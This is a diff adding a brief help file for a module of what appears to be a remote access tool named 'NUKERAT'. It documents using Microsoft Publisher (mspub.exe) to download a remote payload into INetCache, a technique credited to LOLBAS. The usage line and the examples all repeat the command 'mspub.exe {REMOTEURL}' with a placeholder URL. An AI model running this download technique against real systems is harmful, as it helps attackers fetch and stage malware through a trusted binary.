@@ -1,0 +1,16 @@
+ABOUT
+    Microsoft Publisher. LOLBAS documents remote payload download into
+    INetCache.
+
+USAGE:
+    mspub.exe {REMOTEURL}
+
+EXAMPLES:
+    mspub.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    mspub.exe {REMOTEURL}
